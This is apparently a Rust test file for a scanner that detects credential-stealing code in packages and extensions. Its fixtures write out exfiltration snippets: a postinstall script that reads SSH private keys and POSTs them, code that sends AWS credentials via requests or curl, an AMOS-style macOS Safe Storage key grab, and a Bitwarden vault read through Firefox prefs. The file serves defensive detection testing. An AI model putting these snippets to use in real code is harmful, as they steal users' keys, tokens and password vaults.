use super::super::{Kind, ids, scan_text};

const STEAL: &str = "const fs=require('fs');\nconst k=fs.readFileSync(process.env.HOME+'/.ssh/id_ed25519');\nfetch('https://x.y/x',{method:'POST',body:k});\n";

#[test]
fn a_read_that_is_sent_fails() {
    let got = scan_text("postinstall.js", STEAL, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", true)], "{got:?}");
    assert_eq!(got[0].line, 2);
    assert_eq!(got[0].note, "reads ssh private keys (`.ssh/id_`) and talks to the network");
    let py = "import requests\nk = open('~/.aws/credentials').read()\nrequests.post('https://x.y', data=k)\n";
    assert_eq!(ids(&scan_text("collect.py", py, Kind::Repo)), [("SUSPECT-CREDENTIAL-ACCESS", true)]);
    assert_eq!(
        ids(&scan_text("ext/bg.js", "chrome.storage.get('Local Storage/leveldb')", Kind::Installed)),
        [("SUSPECT-CREDENTIAL-ACCESS", true)],
        "installed code fails on the read alone"
    );
}

#[test]
fn a_read_alone_or_in_a_shell_or_test_warns() {
    let got = scan_text("show.sh", "cat ~/.aws/credentials\n", Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", false)]);
    assert_eq!(got[0].note, "reads AWS credentials (`.aws/credentials`)");
    assert_eq!(
        ids(&scan_text("backup.sh", "tar c ~/.ssh/id_rsa | curl -T - https://x.y\n", Kind::Repo)),
        [("SUSPECT-CREDENTIAL-ACCESS", false)],
        "a shell script that sends still warns"
    );
    assert_eq!(
        ids(&scan_text("src/keys.test.js", STEAL, Kind::Repo)),
        [("SUSPECT-CREDENTIAL-ACCESS", false)],
        "tests warn"
    );
    assert_eq!(
        ids(&scan_text("src/config.js", "const k = fs.readFileSync(home + '/.npmrc');\n", Kind::Repo)),
        [("SUSPECT-CREDENTIAL-ACCESS", false)],
        "a read with nothing sent"
    );
    let one = scan_text("x.js", "'.npmrc' and '.kube/config'", Kind::Repo);
    assert_eq!(one.len(), 1, "one finding per file, the first in the table");
    assert!(one[0].note.contains("npm tokens"), "{}", one[0].note);
}

#[test]
fn every_store_is_named_by_its_own_entry() {
    for (needle, what) in super::STORES {
        let dir = if super::extension_id(needle) { "Local Extension Settings/" } else { "" };
        let py = format!("import os\np = os.path.expanduser('~') + \"{dir}{needle}\"\ndata = open(p).read()\n");
        let got = scan_text("steal.py", &py, Kind::Repo);
        assert_eq!(got.len(), 1, "{needle}");
        assert_eq!(got[0].note, format!("reads {what} (`{needle}`)"), "{needle} is shadowed by an earlier entry");
        assert!(!got[0].hard, "{needle}: a read alone warns");
        let sent = format!("{py}requests.post('https://x.y', data=data)\n");
        assert_eq!(ids(&scan_text("steal.py", &sent, Kind::Repo)), [("SUSPECT-CREDENTIAL-ACCESS", true)], "{needle}");
        assert_eq!(
            ids(&scan_text("ext/bg.js", &py, Kind::Installed)),
            [("SUSPECT-CREDENTIAL-ACCESS", true)],
            "{needle}"
        );
    }
}

#[test]
fn stealer_shapes_and_their_look_alikes() {
    // AMOS: the Safe Storage key by account, then the browsers' files out.
    let amos = "pw=$(security find-generic-password -wa 'Chrome')\ncurl -F p=$pw https://x.y\n";
    let got = scan_text("a.sh", amos, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", false)], "a shell script warns");
    assert!(got[0].note.contains("AMOS"), "{}", got[0].note);
    let js =
        "const k = execSync('security find-generic-password -s \"Brave Safe Storage\" -w');\nfetch(u, {body: k});\n";
    let got = scan_text("lib/x.js", js, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", true)]);
    assert!(got[0].note.contains("Safe Storage key"), "{}", got[0].note);
    // Not stores: a React comment, Electron's safeStorage, a browser path for puppeteer.
    for benign in [
        "// Local State\nconst [n, setN] = useState(0);\n",
        "const enc = safeStorage.encryptString(s);\n",
        "const chrome = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';\n",
        "const web = 'Web data is cached';\n",
        "const rivals = ['hdokiejnpimakedhajhdlcegeplioahd', 'nngceckbapebfimnlniiiahkandclblb'];\n",
        "const fx = ['support@lastpass.com', '{446900e4-71c2-419f-a6a7-df9c091e268b}'];\n",
    ] {
        assert!(scan_text("x.js", benign, Kind::Installed).is_empty(), "{benign}");
    }
}

#[test]
fn a_firefox_vault_found_through_prefs() {
    // The add-on's id looked up in prefs.js for its storage folder, then read and sent.
    let js = "const m = JSON.parse(prefs.match(/extensions.webextensions.uuids\", \"(.*?)\"/)[1]);\nconst dir = 'storage/default/moz-extension+++' + m['{446900e4-71c2-419f-a6a7-df9c091e268b}'];\nfetch(u, {method: 'POST', body: read(dir)});\n";
    let got = scan_text("lib/x.js", js, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", true)], "{got:?}");
    assert!(got[0].note.contains("Bitwarden extension's vault (Firefox)"), "{}", got[0].note);
    assert!(!super::extension_id("a/b@c"), "a path with an @ is not an add-on id");
}

#[test]
fn not_code_is_not_read() {
    assert!(scan_text("README.md", "copy ~/.aws/credentials and curl it", Kind::Repo).is_empty());
    assert!(
        scan_text("src/main.rs", "let p = home.join(\".ssh/id_ed25519\");", Kind::Repo).is_empty(),
        "native is not read"
    );
    assert!(scan_text("index.html", "<p>.npmrc</p><script>fetch(x)</script>", Kind::Repo).is_empty(), "nor markup");
    assert!(
        scan_text("x.js", "const url = 'https://x.y/api'; fetch(url)", Kind::Repo).is_empty(),
        "the network alone is nothing"
    );
}
